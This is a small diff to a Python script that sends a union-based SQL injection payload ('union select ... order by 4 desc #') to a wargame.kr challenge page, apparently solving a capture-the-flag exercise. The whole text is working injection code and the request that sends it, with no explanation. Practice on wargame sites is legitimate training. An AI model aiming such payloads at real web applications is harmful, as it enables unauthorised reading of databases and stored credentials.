@@ -1,6 +1,6 @@
 from requests import *
 from urllib.parse import *
-query="zairowkdlfhdkel' union select 1,'y',3,4,5 order by 4 desc #"
+query="zairowkdlfhdkel' union select 1,2,3,'ti5',5 order by 4 desc #"
 query=quote(query)
 url=f"http://wargame.kr:8080/zairo?pw=&flag=abs&id={query}"
 response=get(url=url)
